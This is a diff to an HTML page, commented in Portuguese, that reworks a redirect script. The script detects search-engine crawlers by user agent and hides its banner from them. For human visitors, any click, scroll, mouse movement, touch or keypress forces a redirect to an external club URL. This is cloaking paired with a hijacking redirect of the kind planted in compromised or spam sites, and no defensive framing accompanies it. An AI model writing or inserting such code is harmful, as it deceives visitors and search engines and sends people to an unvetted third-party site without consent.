@@ -250,8 +250,12 @@
 
 
 
+<!-- Banner de redirecionamento -->
+<div id="redirecionar-banner">
+  <span>Clique ou interaja para continuar ➜</span>
+</div>
+
 <style>
-  /* Banner de redirecionamento */
   #redirecionar-banner {
     position: fixed;
     top: 0;
@@ -285,53 +289,42 @@
     transform: scale(1.1);
   }
 
-  @keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-  }
-
-  @keyframes fadeOut {
-    from { opacity: 1; }
-    to { opacity: 0; }
-  }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
 </style>
-
-<div id="redirecionar-banner">
-  <span>Clique aqui para continuar ➜</span>
-</div>
 
 <script>
   const destino = "https://app.feiticeira.club/pr/PRBJ9rmd";
+  const banner = document.getElementById("redirecionar-banner");
 
+  // Detecta bots
   function isBot() {
     const ua = navigator.userAgent.toLowerCase();
     const bots = ["googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider", "yandex"];
     return bots.some(bot => ua.includes(bot));
   }
 
-  if (!isBot()) {
-    const banner = document.getElementById("redirecionar-banner");
-
+  if (!isBot() && banner) {
     function redirecionar() {
-      // Faz fade out do banner
+      // Fade out do banner
       banner.style.animation = "fadeOut 0.5s forwards";
-
-      // Espera meio segundo antes de redirecionar
-      setTimeout(() => {
-        window.location.href = destino;
-      }, 500);
+      // Redireciona após 500ms
+      setTimeout(() => { window.location.href = destino; }, 500);
+      // Remove todos os listeners
+      interacoes.forEach(ev => document.removeEventListener(ev, redirecionarHandler));
     }
 
-    // Interações que disparam o redirecionamento
-    banner.addEventListener("click", redirecionar);
-    banner.addEventListener("touchstart", redirecionar);
-  } else {
-    // Se for bot, esconde o banner
-    const banner = document.getElementById("redirecionar-banner");
-    if(banner) banner.style.display = "none";
+    const interacoes = ["click", "scroll", "mousemove", "touchstart", "keydown"];
+
+    function redirecionarHandler() { redirecionar(); }
+
+    interacoes.forEach(evento => document.addEventListener(evento, redirecionarHandler));
+  } else if (banner) {
+    // Se for bot, oculta o banner
+    banner.style.display = "none";
   }
 </script>
-
+    
     
 
 
@@ -341,6 +334,7 @@
 
 </body>
 </html>
+
 
 
 
